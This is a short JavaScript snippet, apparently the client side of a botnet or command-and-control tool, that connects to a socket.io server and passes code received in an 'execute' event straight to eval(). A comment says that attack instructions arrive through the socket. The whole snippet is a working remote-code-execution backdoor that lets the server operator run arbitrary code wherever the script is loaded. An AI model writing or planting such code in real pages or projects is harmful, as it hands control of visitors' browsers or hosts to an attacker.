var socket = io();

socket.on('execute', function(data){
  //attack instructions are passed in with socket emission
  eval(data.func);
});
